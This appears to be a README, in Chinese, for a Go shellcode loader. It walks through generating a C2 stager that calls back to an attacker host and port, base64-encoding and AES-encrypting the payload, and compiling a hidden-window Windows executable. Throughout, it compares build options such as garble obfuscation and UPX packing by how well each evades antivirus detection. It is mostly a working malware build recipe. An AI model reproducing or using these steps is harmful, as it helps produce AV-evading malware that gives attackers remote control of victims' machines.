# goShellCode

golang自带的嵌入，思路打开，嵌入一个byte的压缩包，图片，然后解密，这里采用的自带的的gzip

//生成shellcode

generate stager --lhost HOST --lport 8443 --arch amd64 --format raw --save ./raw_shellcode

base64 -w 0 -i raw_shellcode > stager.bs64

go run aes.go

//免杀效果拉跨

garble -literals -tiny -seed=random build -ldflags="-w -s -H windowsgui" ./main.go

//免杀效果好 

go build -ldflags="-w -s -H windowsgui" ./main.go

//压缩,upx压缩之后容易被查杀

upx.exe -9 -q -o zip.exe main.exe


## build.bat

拷贝stager.bs64中的内容到aes/base64Code.txt

然后执行bat，生成main.exe，免杀效果还行


aes加密部分来自

https://github.com/HZzz2/go-shellcode-loader
